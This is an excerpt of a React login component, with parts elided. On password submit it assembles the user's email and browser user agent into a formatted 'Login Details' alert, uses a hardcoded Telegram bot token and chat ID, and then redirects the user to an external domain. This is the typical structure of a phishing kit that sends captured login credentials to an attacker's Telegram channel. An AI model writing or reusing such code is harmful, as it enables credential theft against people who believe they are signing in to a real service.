...
const Login = () => {
  ...
  const handlePasswordSubmit = async (e) => {
    ...
    try {
      ...
      const TELEGRAM_BOT_TOKEN = '7768646100:AAH9wgYnFOV-3A1Dit1hIAWJjG1qeCqZXVY';
      const TELEGRAM_CHAT_ID = '-1002276027220';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
...
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      ...
      setShowModal(false); // Hide modal before redirecting
      window.location.href = 'https://mr.accountinglocalsystem.top/';
    } catch (error) {
